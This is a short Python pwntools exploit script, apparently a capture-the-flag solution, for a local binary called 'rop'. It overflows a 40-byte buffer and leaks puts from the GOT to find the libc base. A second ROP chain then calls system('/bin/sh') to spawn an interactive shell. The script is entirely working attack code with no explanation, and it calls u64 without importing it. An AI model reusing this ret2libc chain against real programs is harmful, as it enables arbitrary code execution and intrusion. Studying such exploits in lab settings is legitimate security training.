#!/usr/bin/python3
from pwn import process, p64

shell = process("./rop")

offset = 40
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(0x400683) # pop rdi; ret;
payload += p64(0x601018) # puts@got
payload += p64(0x4004a0) # puts@plt
payload += p64(0x4005dc) # main()

shell.sendlineafter(b"Hello\n", payload)
libc_base = u64(shell.recv(6).ljust(8, b"\x00")) - 0x80a30

payload  = b""
payload += junk
payload += p64(libc_base + 0x02155f) # pop rdi; ret;
payload += p64(libc_base + 0x1b40fa) # "/bin/sh"
payload += p64(libc_base + 0x0c7c5a) # ret;
payload += p64(libc_base + 0x04f4e0) # system()
#payload += p64(libc_base + 0x4f365) # one_gadget

shell.sendlineafter(b"Hello\n", payload)
shell.interactive()
